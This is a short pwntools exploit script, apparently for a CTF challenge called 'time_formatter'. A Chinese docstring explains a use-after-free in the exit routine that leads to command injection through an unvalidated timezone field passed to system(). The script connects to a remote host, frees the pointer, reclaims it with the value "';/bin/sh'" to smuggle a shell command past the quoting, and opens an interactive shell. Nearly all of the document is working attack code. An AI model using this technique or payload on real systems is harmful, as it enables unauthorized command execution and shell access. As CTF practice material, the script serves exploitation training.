"""
退出功能中，先释放了指针（未置空），然后才要求确认是否退出  
    -->  指针释放却不退出  
    -->  UAF
打印功能中，存在system执行命令，其中部分字符取自ptr指针 
    --> 存在命令注入
    --> 直接输入time format时有校验，不能输入';'，无法完成命令注入
    --> 功能3，设置timezone时可将之前释放的空间申请回来（ptr），并且无输入校验，可完成命令注入
"""

from pwn import *

#p = process("./time_formatter")
p = remote("61.147.171.105", 55292)

p.sendlineafter("> ", "1")
p.sendlineafter("Format: ", "aa")
p.sendlineafter("> ", "5")
p.sendlineafter("Are you sure you want to exit (y/N)? ", "N")
p.sendlineafter("> ", "3")
p.sendlineafter("Time zone: ", "';/bin/sh'")  # 注意要加单引号，去闭合command中的单引号
p.sendlineafter("> ", "4")

p.interactive()
